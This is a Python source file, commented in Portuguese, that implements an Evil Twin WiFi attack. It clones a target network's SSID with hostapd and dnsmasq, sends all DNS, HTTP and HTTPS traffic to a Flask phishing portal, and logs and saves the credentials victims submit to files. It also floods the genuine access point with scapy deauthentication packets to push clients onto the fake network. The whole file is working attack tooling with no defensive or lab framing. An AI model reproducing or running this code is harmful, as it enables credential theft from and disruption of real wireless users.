#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Módulo para realizar ataques Evil Twin.
Este módulo cria uma rede WiFi falsa que imita uma rede legítima para capturar credenciais.
"""

import os
import sys
import time
import threading
import signal
import subprocess
import platform
import netifaces
from scapy.all import *
from flask import Flask, request, render_template, redirect, jsonify

# Importa módulos internos
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
try:
    from src.core.logger import Logger
    from src.utils.helpers import get_ip_address, check_port_in_use, find_available_port
except ImportError:
    # Caso esteja sendo executado diretamente
    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
    from core.logger import Logger
    from utils.helpers import get_ip_address, check_port_in_use, find_available_port

# HTML template para a página de login falsa
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ssid}} - Conectar à rede WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
        }
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        .error {
            color: red;
            text-align: center;
            margin-bottom: 15px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-width: 150px;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{{ssid}}</h2>
        </div>
        {% if error %}
        <div class="error">
            {{ error }}
        </div>
        {% endif %}
        <form action="/login" method="post">
            <div class="form-group">
                <label for="password">Senha da rede WiFi:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Conectar</button>
        </form>
    </div>
</body>
</html>
"""

class EvilTwin:
    """Classe para executar ataques Evil Twin."""
    
    def __init__(self, target_ssid=None, target_bssid=None, interface=None, channel=1, logger=None):
        """
        Inicializa o ataque Evil Twin.
        
        Args:
            target_ssid (str): SSID da rede alvo.
            target_bssid (str): BSSID do AP alvo (opcional para desautenticação).
            interface (str): Interface de rede a ser utilizada.
            channel (int): Canal WiFi para o AP falso.
            logger (Logger): Instância do logger para registrar eventos.
        """
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.interface = interface
        self.channel = channel
        self.logger = logger if logger else Logger(verbose=True)
        
        # Configurações padrão
        self.ap_ip = "192.168.100.1"
        self.ap_netmask = "255.255.255.0"
        self.dhcp_range = "192.168.100.2,192.168.100.254"
        self.web_port = 80
        
        # Estado de execução
        self.running = False
        self.ap_interface = None
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.web_server = None
        self.deauth_thread = None
        self.captured_credentials = []
        
        # Configuração do servidor web (Flask)
        self.app = Flask(__name__, 
                        template_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), '../../web/templates')),
                        static_folder=os.path.abspath(os.path.join(os.path.dirname(__file__), '../../web/static')))
        
        # Define as rotas do servidor web
        self._setup_web_routes()
        
        # Detecta o sistema operacional
        self.os_type = platform.system().lower()
        
        # Verifica compatibilidade
        if self.os_type == "windows":
            self.logger.warning("ATENÇÃO: Ataques Evil Twin têm funcionalidade limitada no Windows.")
        
        # Verifica os pré-requisitos
        self._check_prerequisites()
    
    def _check_prerequisites(self):
        """
        Verifica se todos os pré-requisitos para o ataque estão presentes.
        
        Returns:
            bool: True se todos os pré-requisitos estão satisfeitos, False caso contrário.
        """
        # Verifica se o SSID foi especificado
        if not self.target_ssid:
            self.logger.error("SSID alvo não especificado.")
            return False
        
        # Verifica se a interface foi especificada
        if not self.interface:
            self.logger.error("Interface de rede não especificada.")
            return False
        
        # Verifica se a interface existe
        if self.interface not in netifaces.interfaces():
            self.logger.error(f"Interface {self.interface} não encontrada.")
            return False
        
        # No Linux, verifica se as ferramentas necessárias estão instaladas
        if self.os_type == "linux":
            required_tools = ["hostapd", "dnsmasq"]
            missing_tools = []
            
            for tool in required_tools:
                try:
                    subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except subprocess.CalledProcessError:
                    missing_tools.append(tool)
            
            if missing_tools:
                self.logger.error(f"Ferramentas necessárias não encontradas: {', '.join(missing_tools)}")
                self.logger.error("Instale-as usando: apt-get install " + " ".join(missing_tools))
                return False
        
        # No Windows, verifica se é possível criar um AP virtualizado
        elif self.os_type == "windows":
            try:
                # Verifica se o serviço WLAN AutoConfig está ativo
                service_check = subprocess.run(
                    "sc query \"Wlansvc\"", 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                if "RUNNING" not in service_check.stdout.decode('utf-8', errors='ignore'):
                    self.logger.error("O serviço WLAN AutoConfig não está em execução.")
                    return False
                
                # Verifica se o Hosted Network é suportado
                hostednetwork_check = subprocess.run(
                    "netsh wlan show drivers", 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                output = hostednetwork_check.stdout.decode('utf-8', errors='ignore')
                if "Hosted network supported  : Yes" not in output and "Suporta rede hospedada  : Sim" not in output:
                    self.logger.error("Seu adaptador WiFi não suporta Hosted Network.")
                    self.logger.warning("O ataque Evil Twin pode não funcionar corretamente.")
            
            except Exception as e:
                self.logger.error(f"Erro ao verificar pré-requisitos no Windows: {e}")
                return False
        
        # Verifica se a porta Web está disponível
        if check_port_in_use(self.web_port):
            self.logger.warning(f"Porta {self.web_port} já está em uso.")
            new_port = find_available_port(8000)
            if new_port:
                self.logger.info(f"Usando porta alternativa: {new_port}")
                self.web_port = new_port
            else:
                self.logger.error("Não foi possível encontrar uma porta disponível.")
                return False
        
        return True
    
    def _setup_ap_interface(self):
        """
        Configura a interface para o ponto de acesso.
        
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if self.os_type == "windows":
            self.logger.info("Configurando Hosted Network no Windows...")
            
            try:
                # Define o SSID e a chave (sem senha para facilitar o acesso)
                setup_cmd = f'netsh wlan set hostednetwork mode=allow ssid="{self.target_ssid}" key="12345678"'
                subprocess.run(setup_cmd, shell=True, check=True)
                
                # Inicia o Hosted Network
                start_cmd = 'netsh wlan start hostednetwork'
                subprocess.run(start_cmd, shell=True, check=True)
                
                # Obtém o nome da interface virtualizada
                show_cmd = 'netsh wlan show hostednetwork'
                result = subprocess.run(show_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = result.stdout.decode('utf-8', errors='ignore')
                
                # O Hosted Network foi iniciado com sucesso
                if "Started" in output or "Iniciada" in output:
                    self.logger.success("Hosted Network iniciado com sucesso.")
                    
                    # Em alguns casos, precisamos habilitar o compartilhamento de internet
                    # Este é um processo manual no Windows, então apenas registramos instruções
                    self.logger.info("NOTA: Para permitir que clientes se conectem à internet:")
                    self.logger.info("1. Abra Painel de Controle > Rede e Internet > Conexões de Rede")
                    self.logger.info("2. Clique com o botão direito na sua conexão de Internet principal")
                    self.logger.info("3. Selecione Propriedades > guia Compartilhamento")
                    self.logger.info("4. Marque 'Permitir que outros usuários da rede...' e selecione a interface Hosted Network")
                    
                    # Registra a interface virtualizada
                    self.ap_interface = "Microsoft Hosted Network Virtual Adapter"
                    return True
                else:
                    self.logger.error("Falha ao iniciar Hosted Network.")
                    return False
                
            except Exception as e:
                self.logger.error(f"Erro ao configurar AP no Windows: {e}")
                return False
            
        else:  # Linux
            try:
                self.logger.info(f"Configurando interface {self.interface} para o AP...")
                
                # Desativa a interface
                subprocess.run(f"ifconfig {self.interface} down", shell=True)
                
                # Define o modo da interface para managed
                subprocess.run(f"iwconfig {self.interface} mode managed", shell=True)
                
                # Ativa a interface
                subprocess.run(f"ifconfig {self.interface} up", shell=True)
                
                # Configura IP estático
                subprocess.run(f"ifconfig {self.interface} {self.ap_ip} netmask {self.ap_netmask}", shell=True)
                
                # Habilita IP forwarding
                subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
                
                self.ap_interface = self.interface
                self.logger.success(f"Interface {self.interface} configurada com sucesso.")
                return True
                
            except Exception as e:
                self.logger.error(f"Erro ao configurar interface: {e}")
                return False
    
    def _create_hostapd_config(self):
        """
        Cria o arquivo de configuração para o hostapd.
        
        Returns:
            str: Caminho do arquivo de configuração ou None se falhar.
        """
        if self.os_type == "windows":
            # No Windows, não usamos hostapd, usamos Hosted Network
            return None
            
        try:
            config_path = "/tmp/hostapd.conf"
            
            config_content = f"""
interface={self.interface}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            
            with open(config_path, 'w') as f:
                f.write(config_content)
            
            self.logger.debug(f"Arquivo de configuração do hostapd criado em {config_path}")
            return config_path
            
        except Exception as e:
            self.logger.error(f"Erro ao criar arquivo de configuração do hostapd: {e}")
            return None
    
    def _create_dnsmasq_config(self):
        """
        Cria o arquivo de configuração para o dnsmasq.
        
        Returns:
            str: Caminho do arquivo de configuração ou None se falhar.
        """
        if self.os_type == "windows":
            # No Windows, não usamos dnsmasq
            return None
            
        try:
            config_path = "/tmp/dnsmasq.conf"
            
            config_content = f"""
interface={self.interface}
dhcp-range={self.dhcp_range},12h
dhcp-option=3,{self.ap_ip}
dhcp-option=6,{self.ap_ip}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/{self.ap_ip}
"""
            
            with open(config_path, 'w') as f:
                f.write(config_content)
            
            self.logger.debug(f"Arquivo de configuração do dnsmasq criado em {config_path}")
            return config_path
            
        except Exception as e:
            self.logger.error(f"Erro ao criar arquivo de configuração do dnsmasq: {e}")
            return None
    
    def _setup_routing(self):
        """
        Configura regras de firewall e roteamento para redirecionar requisições.
        
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if self.os_type == "windows":
            self.logger.info("No Windows, o redirecionamento deve ser configurado manualmente.")
            self.logger.info("Todas as requisições serão atendidas pelo servidor web local.")
            return True
            
        try:
            # Limpa regras existentes
            subprocess.run("iptables -F", shell=True)
            subprocess.run("iptables -t nat -F", shell=True)
            
            # Habilita NAT
            subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True)
            
            # Redireciona todo tráfego HTTP para o servidor local
            subprocess.run(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {self.ap_ip}:{self.web_port}", shell=True)
            
            # Redireciona todo tráfego HTTPS para o servidor local
            subprocess.run(f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination {self.ap_ip}:{self.web_port}", shell=True)
            
            self.logger.success("Regras de firewall configuradas com sucesso.")
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao configurar regras de firewall: {e}")
            return False
    
    def _start_hostapd(self, config_path):
        """
        Inicia o processo hostapd para criar o AP.
        
        Args:
            config_path (str): Caminho do arquivo de configuração.
            
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if self.os_type == "windows":
            # No Windows, já iniciamos o Hosted Network
            return True
            
        try:
            # Mata qualquer instância anterior
            subprocess.run("killall hostapd 2>/dev/null", shell=True)
            
            # Inicia o hostapd
            self.hostapd_process = subprocess.Popen(
                ["hostapd", config_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Aguarda um pouco para o hostapd iniciar
            time.sleep(3)
            
            # Verifica se o processo está rodando
            if self.hostapd_process.poll() is None:
                self.logger.success("Ponto de acesso criado com sucesso.")
                return True
            else:
                stdout, stderr = self.hostapd_process.communicate()
                self.logger.error(f"Falha ao iniciar hostapd: {stderr.decode()}")
                return False
                
        except Exception as e:
            self.logger.error(f"Erro ao iniciar hostapd: {e}")
            return False
    
    def _start_dnsmasq(self, config_path):
        """
        Inicia o processo dnsmasq para fornecer serviço DHCP.
        
        Args:
            config_path (str): Caminho do arquivo de configuração.
            
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if self.os_type == "windows":
            # No Windows, usamos o serviço ICS para DHCP
            return True
            
        try:
            # Mata qualquer instância anterior
            subprocess.run("killall dnsmasq 2>/dev/null", shell=True)
            
            # Inicia o dnsmasq
            self.dnsmasq_process = subprocess.Popen(
                ["dnsmasq", "-C", config_path, "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Aguarda um pouco para o dnsmasq iniciar
            time.sleep(2)
            
            # Verifica se o processo está rodando
            if self.dnsmasq_process.poll() is None:
                self.logger.success("Servidor DHCP iniciado com sucesso.")
                return True
            else:
                stdout, stderr = self.dnsmasq_process.communicate()
                self.logger.error(f"Falha ao iniciar dnsmasq: {stderr.decode()}")
                return False
                
        except Exception as e:
            self.logger.error(f"Erro ao iniciar dnsmasq: {e}")
            return False
    
    def _setup_web_routes(self):
        """Configura as rotas do servidor web Flask."""
        
        app = self.app
        
        @app.route('/', defaults={'path': ''})
        @app.route('/<path:path>')
        def catch_all(path):
            """Rota que captura todas as requisições."""
            self.logger.info(f"Requisição recebida: {request.url}")
            return render_template('login.html')
        
        @app.route('/login', methods=['POST'])
        def login():
            """Rota para processar tentativas de login."""
            if request.is_json:
                data = request.get_json()
                username = data.get('username', '')
                password = data.get('password', '')
            else:
                username = request.form.get('username', '')
                password = request.form.get('password', '')
            
            if username and password:
                self.logger.success(f"Credenciais capturadas - Usuário: {username}, Senha: {password}")
                
                # Registra as credenciais
                self.captured_credentials.append({
                    'username': username,
                    'password': password,
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'ip': request.remote_addr,
                    'user_agent': request.headers.get('User-Agent', 'Unknown')
                })
                
                # Salva as credenciais em um arquivo
                self._save_credentials()
                
                if request.is_json:
                    return jsonify({'success': True})
                else:
                    return redirect('/success')
            
            if request.is_json:
                return jsonify({'success': False, 'message': 'Credenciais inválidas'})
            else:
                return render_template('login.html', error="Credenciais inválidas. Tente novamente.")
        
        @app.route('/success')
        def success():
            """Página de sucesso após login."""
            return render_template('success.html')
    
    def _start_web_server(self):
        """
        Inicia o servidor web Flask.
        
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        def run_flask():
            try:
                self.app.run(host='0.0.0.0', port=self.web_port, debug=False, use_reloader=False)
            except Exception as e:
                self.logger.error(f"Erro ao iniciar servidor web: {e}")
        
        try:
            # Inicia o Flask em uma thread separada
            self.web_server = threading.Thread(target=run_flask)
            self.web_server.daemon = True
            self.web_server.start()
            
            self.logger.success(f"Servidor web iniciado na porta {self.web_port}")
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao iniciar servidor web: {e}")
            return False
    
    def _start_deauth_attack(self):
        """
        Inicia um ataque de desautenticação no AP alvo.
        
        Returns:
            bool: True se bem-sucedido, False caso contrário.
        """
        if not self.target_bssid:
            self.logger.warning("BSSID alvo não especificado. Desautenticação não será realizada.")
            return False
        
        if self.os_type == "windows":
            self.logger.warning("Ataques de desautenticação têm suporte limitado no Windows.")
            return False
        
        def deauth_thread():
            try:
                self.logger.info(f"Iniciando ataque de desautenticação contra BSSID {self.target_bssid}...")
                
                # Cria pacote de desautenticação
                deauth_packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, addr3=self.target_bssid) / Dot11Deauth(reason=7)
                
                while self.running:
                    try:
                        # Envia pacotes de desautenticação
                        sendp(deauth_packet, count=5, inter=0.1, verbose=False, iface=self.interface)
                        time.sleep(2)
                    except Exception as e:
                        self.logger.debug(f"Erro ao enviar pacotes de desautenticação: {e}")
                        time.sleep(1)
                
                self.logger.info("Ataque de desautenticação finalizado.")
                
            except Exception as e:
                self.logger.error(f"Erro no thread de desautenticação: {e}")
        
        try:
            # Inicia o ataque em uma thread separada
            self.deauth_thread = threading.Thread(target=deauth_thread)
            self.deauth_thread.daemon = True
            self.deauth_thread.start()
            
            self.logger.info("Thread de desautenticação iniciada.")
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao iniciar ataque de desautenticação: {e}")
            return False
    
    def _save_credentials(self):
        """Salva as credenciais capturadas em um arquivo."""
        try:
            credentials_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'captured')
            
            # Cria o diretório se não existir
            os.makedirs(credentials_dir, exist_ok=True)
            
            # Nome do arquivo com timestamp
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            credentials_file = os.path.join(credentials_dir, f"credentials_{timestamp}.txt")
            
            # Salva as credenciais
            with open(credentials_file, 'w') as f:
                f.write(f"=== Credenciais Capturadas - {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                
                for cred in self.captured_credentials:
                    f.write(f"Timestamp: {cred['timestamp']}\n")
                    f.write(f"IP: {cred['ip']}\n")
                    f.write(f"Usuário: {cred['username']}\n")
                    f.write(f"Senha: {cred['password']}\n")
                    f.write(f"User-Agent: {cred['user_agent']}\n")
                    f.write("\n" + ("-" * 40) + "\n\n")
            
            self.logger.info(f"Credenciais salvas em {credentials_file}")
            
        except Exception as e:
            self.logger.error(f"Erro ao salvar credenciais: {e}")
    
    def _cleanup(self):
        """Limpa os recursos utilizados pelo ataque."""
        self.logger.info("Limpando recursos...")
        
        # Para a desautenticação
        if self.deauth_thread and self.deauth_thread.is_alive():
            self.running = False
            self.deauth_thread.join(1)
        
        if self.os_type == "windows":
            # No Windows, para o Hosted Network
            try:
                subprocess.run("netsh wlan stop hostednetwork", shell=True)
                self.logger.info("Hosted Network parado.")
            except Exception as e:
                self.logger.error(f"Erro ao parar Hosted Network: {e}")
        else:
            # No Linux, para os processos e limpa iptables
            try:
                # Para o hostapd
                if self.hostapd_process:
                    self.hostapd_process.terminate()
                    self.hostapd_process.wait(2)
                    self.logger.info("Processo hostapd finalizado.")
                
                # Para o dnsmasq
                if self.dnsmasq_process:
                    self.dnsmasq_process.terminate()
                    self.dnsmasq_process.wait(2)
                    self.logger.info("Processo dnsmasq finalizado.")
                
                # Limpa regras de firewall
                subprocess.run("iptables -F", shell=True)
                subprocess.run("iptables -t nat -F", shell=True)
                self.logger.info("Regras de firewall limpas.")
                
                # Desativa IP forwarding
                subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
                self.logger.info("IP forwarding desativado.")
                
                # Restaura a interface
                subprocess.run(f"ifconfig {self.interface} down", shell=True)
                subprocess.run(f"ifconfig {self.interface} 0.0.0.0", shell=True)
                subprocess.run(f"ifconfig {self.interface} up", shell=True)
                self.logger.info(f"Interface {self.interface} restaurada.")
                
            except Exception as e:
                self.logger.error(f"Erro ao limpar recursos: {e}")
        
        # Salva as credenciais capturadas
        if self.captured_credentials:
            self._save_credentials()
    
    def start_attack(self):
        """
        Inicia o ataque Evil Twin.
        
        Returns:
            bool: True se o ataque foi iniciado com sucesso, False caso contrário.
        """
        self.logger.attack(f"Iniciando ataque Evil Twin com SSID '{self.target_ssid}'...")
        
        # Verifica os pré-requisitos novamente
        if not self._check_prerequisites():
            return False
        
        try:
            self.running = True
            
            # Configura a interface para o AP
            if not self._setup_ap_interface():
                self.logger.error("Falha ao configurar interface para o AP.")
                self._cleanup()
                return False
            
            if self.os_type != "windows":
                # Cria os arquivos de configuração
                hostapd_config = self._create_hostapd_config()
                dnsmasq_config = self._create_dnsmasq_config()
                
                if not hostapd_config or not dnsmasq_config:
                    self.logger.error("Falha ao criar arquivos de configuração.")
                    self._cleanup()
                    return False
                
                # Configura regras de roteamento
                if not self._setup_routing():
                    self.logger.error("Falha ao configurar roteamento.")
                    self._cleanup()
                    return False
                
                # Inicia o hostapd
                if not self._start_hostapd(hostapd_config):
                    self.logger.error("Falha ao iniciar hostapd.")
                    self._cleanup()
                    return False
                
                # Inicia o dnsmasq
                if not self._start_dnsmasq(dnsmasq_config):
                    self.logger.error("Falha ao iniciar dnsmasq.")
                    self._cleanup()
                    return False
            
            # Inicia o servidor web
            if not self._start_web_server():
                self.logger.error("Falha ao iniciar servidor web.")
                self._cleanup()
                return False
            
            # Inicia o ataque de desautenticação (opcional)
            if self.target_bssid:
                self._start_deauth_attack()
            
            self.logger.success(f"Ataque Evil Twin iniciado com sucesso. SSID: {self.target_ssid}")
            
            # Se o ataque for iniciado no Windows, exibe informações adicionais
            if self.os_type == "windows":
                self.logger.info(f"Servidor web acessível em http://{get_ip_address()}:{self.web_port}")
                self.logger.info("Certifique-se de configurar o compartilhamento de internet (ICS) manualmente se necessário.")
            
            # Espera até ser interrompido
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.logger.info("Ataque interrompido pelo usuário.")
                self.stop_attack()
            
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao iniciar ataque Evil Twin: {e}")
            self.stop_attack()
            return False
    
    def stop_attack(self):
        """Para o ataque Evil Twin e limpa os recursos."""
        if not self.running:
            return
        
        self.logger.info("Parando ataque Evil Twin...")
        self.running = False
        
        # Limpa os recursos
        self._cleanup()
        
        self.logger.success("Ataque Evil Twin finalizado.")
        
        # Exibe resumo das credenciais capturadas
        if self.captured_credentials:
            self.logger.info(f"Total de credenciais capturadas: {len(self.captured_credentials)}")
        else:
            self.logger.info("Nenhuma credencial capturada.")
    
    def get_captured_credentials(self):
        """
        Obtém as credenciais capturadas.
        
        Returns:
            list: Lista de credenciais capturadas.
        """
        return self.captured_credentials 